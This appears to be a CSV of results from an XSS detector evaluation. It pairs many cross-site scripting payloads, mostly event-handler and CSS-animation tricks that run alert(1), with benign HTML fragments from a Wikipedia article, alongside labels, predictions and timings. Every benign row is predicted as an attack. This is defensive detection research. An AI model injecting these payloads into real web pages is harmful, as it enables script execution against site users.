payload,true_label,predicted_label,similarity_score,inference_time_ms
<button onfocusout=alert(1) id=x></button><input autofocus>,1,1,8.8301,21.6683
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></datalist>",1,1,8.6828,30.5125
"<li><a href=""/wiki/Universal_basic_income"" class=""mw-redirect"" title=""Universal basic income"">Universal basic income </a> </li>",0,1,8.8256,35.4534
"<li id=""cite_note-324""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-324"">^ </a> </b> ",0,1,8.9305,42.4943
"<param oncut=""alert(1)"" contenteditable>test</param>",1,1,8.8262,35.2702
"<bdi ondblclick=""alert(1)"">test</bdi>",1,1,8.8178,26.1809
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,23.5531
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=38"" title=""Edit section: Finance and economics"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,8.7614,31.5534
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",1,1,8.7658,23.753
"<wbr onclick=""alert(1)"">test</wbr>",1,1,8.8472,20.8411
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Academic_journal"" title=""Academic journal"">Journals </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,1,8.7853,51.7616
 </li>,0,1,8.6096,14.2039
 </li>,0,1,8.6096,13.6685
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1,1,8.6705,21.1668
"<center onbeforecopy=""alert(1)"" contenteditable>test</center>",1,1,8.7181,17.9415
	 </span> </li>,0,1,8.4977,15.1878
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",1,1,8.8414,15.0121
"<li><a href=""/wiki/Mental_image"" title=""Mental image"">Mental image </a> </li>",0,1,8.8428,20.1291
"<abbr ondblclick=""alert(1)"">test</abbr>",1,1,8.8412,17.9737
<colgroup onpointermove=alert(1)>XSS</colgroup>,1,1,8.804,19.5068
AI becomes hugely successful in the early 21st century,0,1,8.9223,13.5265
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,1,1,8.7677,16.486
<svg><address onload=alert(1)></address>,1,1,8.8405,16.272
"	 <div style=""padding:0em 0.25em"">",0,1,8.7716,15.5468
"<li><a href=""/wiki/Bill_Hibbard"" title=""Bill Hibbard"">Bill Hibbard </a> </li>",0,1,8.66,23.3558
	 </span>,0,1,8.6496,11.8164
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1,1,8.6631,26.6194
<footer id=x tabindex=1 onfocus=alert(1)></footer>,1,1,8.7497,18.1917
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,1,1,8.7503,22.3907
"<time onclick=""alert(1)"">test</time>",1,1,8.9356,14.7272
" </p><p>Several different forms of logic are used in AI research. <a href=""/wiki/Propositional_logic"" class=""mw-redirect"" title=""Propositional logic"">Propositional logic </a><sup id=""cite_ref-Propositional_logic_197-0"" class=""reference""><a href=""#cite_note-Propositional_logic-197"">&#91;193&#93; </a> </sup> involves <a href=""/wiki/Truth_function"" title=""Truth function"">truth functions </a> such as ""or"" and ""not"". <a href=""/wiki/First-order_logic"" title=""First-order logic"">First-order logic </a><sup id=""cite_ref-First-order_logic_198-0"" class=""reference""><a href=""#cite_note-First-order_logic-198"">&#91;194&#93; </a> </sup> adds <a href=""/wiki/Quantifier_(logic)"" title=""Quantifier (logic)"">quantifiers </a> and <a href=""/wiki/Predicate_(mathematical_logic)"" title=""Predicate (mathematical logic)"">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href=""/wiki/Fuzzy_set_theory"" class=""mw-redirect"" title=""Fuzzy set theory"">Fuzzy set theory </a> assigns a ""degree of truth"" (between 0 and 1) to vague statements such as ""Alice is old"" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href=""/wiki/Fuzzy_logic"" title=""Fuzzy logic"">Fuzzy logic </a> is successfully used in <a href=""/wiki/Control_system"" title=""Control system"">control systems </a> to allow experts to contribute vague rules such as ""if you are close to the destination station and moving fast, increase the train's brake pressure""; these vague rules can then be numerically refined within the system. Fuzzy logic fails to scale well in knowledge bases; many AI researchers question the validity of chaining fuzzy-logic inferences.<sup id=""cite_ref-200"" class=""reference""><a href=""#cite_note-200"">&#91;e&#93; </a> </sup><sup id=""cite_ref-Fuzzy_logic_201-0"" class=""reference""><a href=""#cite_note-Fuzzy_logic-201"">&#91;196&#93; </a> </sup><sup id=""cite_ref-202"" class=""reference""><a href=""#cite_note-202"">&#91;197&#93; </a> </sup>",0,1,8.6294,190.362
"<aside onmouseout=""alert(1)"">test</aside>",1,1,8.8879,18.7883
 </ul>,0,1,8.5072,15.2372
"          <dd><a href=""/en/1.2/"">1.2</a></dd>",0,1,8.9369,18.7797
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,8.569,26.5332
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1,1,8.8825,22.0506
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=71"" title=""Edit section: Explanatory notes"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,8.7329,30.7961
"<canvas oncontextmenu=""alert(1)"">test</canvas>",1,1,8.7892,17.6378
<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>,1,1,8.7144,19.3812
"<source oncontextmenu=""alert(1)"">test</source>",1,1,8.8553,13.6925
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1,1,8.7506,18.3035
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",1,1,8.7074,19.0038
<source onpointerdown=alert(1)>XSS</source>,1,1,8.8993,16.3856
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,1,1,8.7779,19.6892
"<li class=""toclevel-1 tocsection-72""><a href=""#References""><span class=""tocnumber"">13 ",0,1,8.7202,19.6727
"	 </span> <span class=""toctext"">Robot rights ",0,1,8.6641,16.6527
<button onpointermove=alert(1)>XSS</button>,1,1,8.7826,18.4075
"<col onmousemove=""alert(1)"">test</col>",1,1,8.8693,17.3273
 ,0,1,9.5403,13.2901
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1,1,8.6243,24.9663
"<b onmouseup=""alert(1)"">test</b>",1,1,8.8435,16.0543
<button id=x tabindex=1 onactivate=alert(1)></button>,1,1,8.781,16.1597
"	 </span> <span class=""toctext"">The limits of artificial general intelligence ",0,1,8.6931,18.7371
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1,1,8.8261,17.6135
 </div>,0,1,8.6546,12.4565
<ol onpointerout=alert(1)>XSS</ol>,1,1,8.8771,16.8136
"<button onpaste=""alert(1)"" contenteditable>test</button>",1,1,8.7748,14.948
"<li id=""cite_note-320""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-320"">^ </a> </b> ",0,1,8.8997,24.8503
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",1,1,8.8483,18.1868
"<li><a href=""/wiki/Received_view_of_theories"" title=""Received view of theories"">Received view </a>&#160;/&#32;<a href=""/wiki/Semantic_view_of_theories"" title=""Semantic view of theories"">Semantic view of theories </a> </li>",0,1,8.8935,36.6977
"<li id=""cite_note-309""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-309"">^ </a> </b> ",0,1,8.9191,25.4118
"  <link rel=""stylesheet"" href=""_static/css/tooltipster-sideTip-shadow.min.css"" type=""text/css"" />",0,1,8.713,20.1025
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",1,1,8.75,17.6568
"<li><a href=""/wiki/Software_framework"" title=""Software framework"">Software framework </a> </li>",0,1,8.7976,18.7783
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1,1,8.7763,25.1223
"<li><a href=""/wiki/AI_box"" title=""AI box"">AI box </a> </li>",0,1,8.7433,68.2048
"	 <div id=""Glossaries_of_science_and_engineering"" style=""font-size:114%;margin:0 4em"">Glossaries of science and engineering </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0,1,8.7147,44.959
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",1,1,8.8769,21.0429
"	 </span> </a> </div><ul style=""border-top:1px solid #aaa; padding: 0.75em 0; width:217px; margin:0 auto;""><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/27px-Wiktionary-logo-v2.svg.png"" decoding=""async"" width=""27"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/41px-Wiktionary-logo-v2.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/0/06/Wiktionary-logo-v2.svg/54px-Wiktionary-logo-v2.svg.png 2x"" data-file-width=""391"" data-file-height=""391"" /> ",0,1,8.8448,190.8065
"<li><a href=""/wiki/Testability"" title=""Testability"">Testability </a> </li>",0,1,8.8391,63.6908
"<h3><span class=""mw-headline"" id=""Probabilistic_methods_for_uncertain_reasoning"">Probabilistic methods for uncertain reasoning ",0,1,8.6943,22.2446
	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0,1,8.7831,20.0656
"	 <div style=""padding:0em 0.25em"">",0,1,8.7716,18.0033
"<table oncontextmenu=""alert(1)"">test</table>",1,1,8.8783,25.0602
	 </span>,0,1,8.6496,19.9047
"<li class=""toclevel-2 tocsection-8""><a href=""#Learning""><span class=""tocnumber"">4.4 ",0,1,8.6649,25.361
<samp onpointermove=alert(1)>XSS</samp>,1,1,8.7908,20.5022
<mark onpointerleave=alert(1)>XSS</mark>,1,1,8.835,18.7498
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,1,8.7317,18.5768
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",1,1,8.6978,25.1257
 </div>,0,1,8.6546,13.3585
<body onload=alert(1)>,1,1,8.9315,15.8841
	 </span> </li>,0,1,8.4977,16.0971
"<image onmousedown=""alert(1)"">test</image>",1,1,8.8628,20.1971
	 </span>,0,1,8.6496,17.1234
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Iphofen, Ron; Kritikos, Mihalis (3 January 2019). ""Regulating artificial intelligence and robotics: ethics by design in a digital society"". <i>Contemporary Social Science </i>: 1??5. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F21582041.2018.1563803"">10.1080/21582041.2018.1563803 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/2158-2041"">2158-2041 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Contemporary+Social+Science&amp;rft.atitle=Regulating+artificial+intelligence+and+robotics%3A+ethics+by+design+in+a+digital+society&amp;rft.pages=1-15&amp;rft.date=2019-01-03&amp;rft_id=info%3Adoi%2F10.1080%2F21582041.2018.1563803&amp;rft.issn=2158-2041&amp;rft.aulast=Iphofen&amp;rft.aufirst=Ron&amp;rft.au=Kritikos%2C+Mihalis&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,9.0035,181.9981
	 </span>(1910) </li>,0,1,8.9606,15.738
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",1,1,8.8582,20.751
<svg><noembed onload=alert(1)></noembed>,1,1,8.803,18.3834
"<rp onmouseenter=""alert(1)"">test</rp>",1,1,8.8208,19.9053
"<element onmouseout=""alert(1)"">test</element>",1,1,8.869,17.8031
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",1,1,8.7082,18.6611
</script>,0,1,8.6632,17.0236
"<div class=""section"" id=""all-the-rest"">",0,1,8.8292,16.1923
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human???computer interaction"">Human???computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,1,8.7641,52.2476
"<ul><li><a href=""/wiki/Symbolic_artificial_intelligence"" title=""Symbolic artificial intelligence"">Symbolic </a> </li>",0,1,8.7793,23.521
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",1,1,8.7744,20.7211
"	 </span>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/16622160"">16622160 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+the+American+Medical+Informatics+Association&amp;rft.atitle=Using+Commercial+Knowledge+Bases+for+Clinical+Decision+Support%3A+Opportunities%2C+Hurdles%2C+and+Recommendations&amp;rft.volume=13&amp;rft.issue=4&amp;rft.pages=369-371&amp;rft.date=2006-07-01&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rft_id=info%3Apmid%2F16622160&amp;rft_id=info%3Adoi%2F10.1197%2Fjamia.M2055&amp;rft.aulast=Kuperman&amp;rft.aufirst=G.+J.&amp;rft.au=Reichley%2C+R.+M.&amp;rft.au=Bailey%2C+T.+C.&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.9409,172.9504
"<object onmouseover=""alert(1)"">test</object>",1,1,8.8362,16.9067
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",1,1,8.6844,31.1827
"<dl class=""docutils"">",0,1,8.8797,17.358
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,8.564,23.4615
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.8737,72.3292
	 </span>,0,1,8.6496,12.9908
<embed onpointermove=alert(1)>XSS</embed>,1,1,8.7532,18.9894
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/leaders/21740735-humans-have-had-good-run-most-recent-breakthrough-robotics-it-clear"">""IKEA furniture and the limits of AI"" </a>. <i>The Economist </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">24 April ",0,1,8.6279,53.0276
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",1,1,8.6974,16.7647
"<li id=""cite_note-263""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-263"">^ </a> </b> ",0,1,8.9117,28.3718
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,1,8.8601,18.0739
<dl onpointerdown=alert(1)>XSS</dl>,1,1,8.9047,16.0433
"<blink onmousedown=""alert(1)"">test</blink>",1,1,8.8798,17.8243
"<li><a href=""/wiki/Software_quality"" title=""Software quality"">Software quality </a> </li> </ul>",0,1,8.8585,20.0348
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1,1,8.7724,22.45
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,19.9088
"<li><a href=""/wiki/Philosophy_of_social_science"" title=""Philosophy of social science"">Social science </a> </li>",0,1,8.7549,20.8162
 </li>,0,1,8.6096,13.3789
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",1,1,8.7345,20.3457
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",1,1,8.7506,19.5009
"<li id=""cite_note-302""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-302"">^ </a> </b> ",0,1,8.9403,28.2145
<input4 onpointermove=alert(1)>XSS</input4>,1,1,8.7562,18.6474
"<li id=""cite_note-402""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-402"">^ </a> </b> ",0,1,8.8777,25.9545
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",1,1,8.6895,20.3412
"<tt ondblclick=""alert(1)"">test</tt>",1,1,8.8263,15.6132
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,8.8455,20.3651
"Dreyfus criticized the <a href=""/wiki/Necessary_and_sufficient"" class=""mw-redirect"" title=""Necessary and sufficient"">necessary </a> condition of the <a href=""/wiki/Physical_symbol_system"" title=""Physical symbol system"">physical symbol system </a> hypothesis, which he called the ""psychological assumption"": ""The mind can be viewed as a device operating on bits of information according to formal rules."" (<a href=""#CITEREFDreyfus1992"">Dreyfus 1992 </a>, p.&#160;156) ",0,1,8.6743,48.7749
"	 </span> <span class=""toctext"">Economics ",0,1,8.7219,14.1267
"<li><a href=""/wiki/Philosophy_of_biology"" title=""Philosophy of biology"">Biology </a> </li>",0,1,8.9177,20.2135
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",1,1,8.7407,21.6276
"<track onmouseover=""alert(1)"">test</track>",1,1,8.8718,16.6616
	 </span> </a> </li>,0,1,8.6362,17.2297
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,1,8.6787,21.2958
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1,1,8.7354,18.8381
"<section onmouseover=""alert(1)"">test</section>",1,1,8.8621,15.9552
"<time oncontextmenu=""alert(1)"">test</time>",1,1,8.8268,16.5984
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;227??31 </li>",0,1,8.7331,27.022
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",1,1,8.5964,25.9241
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",1,1,8.6395,15.8447
"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0,1,8.8702,20.9195
"<li id=""cite_note-AI_at_Stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Stanford_in_the_60s_161-0"">^ </a> </b> ",0,1,8.8745,39.0314
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",1,1,8.6365,30.732
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" ontransitionend=alert(1)></code>",1,1,8.6744,22.3276
"<li id=""cite_note-366""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-366"">^ </a> </b> ",0,1,8.8476,25.0856
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",1,1,8.7388,24.9461
"<col oncut=""alert(1)"" contenteditable>test</col>",1,1,8.8101,17.1391
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",1,1,8.647,17.0798
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;51??07 </li>",0,1,8.8268,23.4975
<figure id=x tabindex=1 onactivate=alert(1)></figure>,1,1,8.745,16.9272
	 </span>,0,1,8.6496,12.0633
 ,0,1,9.5403,11.7632
 </li>,0,1,8.6096,15.92
"<li><a href=""/wiki/Evolutionary_multimodal_optimization"" title=""Evolutionary multimodal optimization"">Evolutionary multimodal optimization </a> </li>",0,1,8.7987,25.7694
"<figure draggable=""true"" ondragenter=""alert(1)"">test</figure>",1,1,8.7688,20.9353
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",1,1,8.8118,18.3503
<svg><bdi onload=alert(1)></bdi>,1,1,8.7663,16.6556
"<li><a href=""/wiki/Machine_vision"" title=""Machine vision"">Machine vision </a> </li>",0,1,8.8362,23.4593
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1,1,8.7877,19.7406
"<picture onmouseup=""alert(1)"">test</picture>",1,1,8.8647,19.2198
"<details draggable=""true"" ondragend=""alert(1)"">test</details>",1,1,8.8442,23.1778
"<STYLE TYPE=""text/javascript"">alert('');</STYLE>",1,1,8.9321,22.2742
"<li><a href=""/wiki/Control_theory"" title=""Control theory"">Control method </a> </li>",0,1,8.8078,16.7038
<applet onreadystatechange=alert(1)></applet>,1,1,8.7817,15.9171
 </li>,0,1,8.6096,12.0936
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=30"" title=""Edit section: Classifiers and statistical learning methods"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,8.7751,34.5662
"<output oncut=""alert(1)"" contenteditable>test</output>",1,1,8.7952,19.6063
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",1,1,8.7461,25.623
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=How+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&amp;rft.btitle=Architectures+for+Intelligence&amp;rft.place=Hillsdale%2C+NJ&amp;rft.pages=225-239&amp;rft.pub=Lawrence+Erlbaum+Associates&amp;rft.date=1991&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.52.9510&amp;rft.aulast=Brooks&amp;rft.aufirst=R.+A.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,8.7882,101.6311
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,8.564,22.548
"<element onmouseenter=""alert(1)"">test</element>",1,1,8.8854,16.362
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",1,1,8.8038,18.9141
"<li id=""cite_note-134""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-134"">^ </a> </b> ",0,1,8.9143,25.1082
"<li id=""cite_note-AI_as_evolution-412""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_as_evolution_412-0"">^ </a> </b> ",0,1,8.8512,31.6575
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",1,1,8.7136,17.636
"<command onkeyup=""alert(1)"" contenteditable>test</command>",1,1,8.7882,18.6458
Discussion:,0,1,8.9992,13.6187
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1,1,8.798,14.7703
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1,1,8.8425,18.1237
"<source onmouseup=""alert(1)"">test</source>",1,1,8.8962,15.5874
"<li><a href=""/wiki/Enterprise_information_system"" title=""Enterprise information system"">Enterprise information system </a> </li>",0,1,8.8178,26.0239
<shadow onpointermove=alert(1)>XSS</shadow>,1,1,8.8024,19.3133
"<li><a href=""/wiki/Three-dimensional_integrated_circuit"" title=""Three-dimensional integrated circuit"">Three-dimensional integrated circuit </a> </li> </ul>",0,1,8.7819,26.0398
"	 </span> <span class=""reference-text""><cite class=""citation book"">Pennachin, C.; Goertzel, B. (2007). <i>Contemporary Approaches to Artificial General Intelligence </i>. <i>Artificial General Intelligence. Cognitive Technologies </i>. Cognitive Technologies. Berlin, Heidelberg: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-540-68677-4_1"">10.1007/978-3-540-68677-4_1 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-540-23733-4"" title=""Special:BookSources/978-3-540-23733-4""><bdi>978-3-540-23733-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Contemporary+Approaches+to+Artificial+General+Intelligence&amp;rft.place=Berlin%2C+Heidelberg&amp;rft.series=Cognitive+Technologies&amp;rft.pub=Springer&amp;rft.date=2007&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-540-68677-4_1&amp;rft.isbn=978-3-540-23733-4&amp;rft.aulast=Pennachin&amp;rft.aufirst=C.&amp;rft.au=Goertzel%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,9.075,186.8405
<svg onpointerenter=alert(1)>XSS</svg>,1,1,8.7999,15.3249
	 </ul>,0,1,8.5072,14.5578
<hgroup onpointerenter=alert(1)>XSS</hgroup>,1,1,8.8444,26.0001
"<keygen onclick=""alert(1)"">test</keygen>",1,1,8.8992,19.3724
"<section onmouseup=""alert(1)"">test</section>",1,1,8.9144,62.3748
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></aside>",1,1,8.6459,33.8729
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1,1,8.9116,24.6948
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race"">""Google leads in the race to dominate artificial intelligence"" </a>. <i>The Economist </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,1,8.6829,59.2649
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",1,1,8.7452,23.9202
<image2 onpointerdown=alert(1)>XSS</image2>,1,1,8.882,20.9602
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",1,1,8.883,24.3941
"<figure oncut=""alert(1)"" contenteditable>test</figure>",1,1,8.7643,19.3544
<title>Artificial intelligence - Wikipedia </title>,0,1,8.9671,16.9495
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1,1,8.7938,19.9601
"	 <div style=""padding:0em 0.25em"">",0,1,8.7716,16.0739
<iframe id=x onfocusin=alert(1)>,1,1,8.7116,18.9232
"<menu onmouseover=""alert(1)"">test</menu>",1,1,8.85,20.5953
</div>,0,1,8.6546,15.9903
"<figcaption draggable=""true"" ondrag=""alert(1)"">test</figcaption>",1,1,8.7963,16.5115
"<section ondblclick=""alert(1)"">test</section>",1,1,8.8904,16.5758
"<map onkeydown=""alert(1)"" contenteditable>test</map>",1,1,8.8318,18.2033
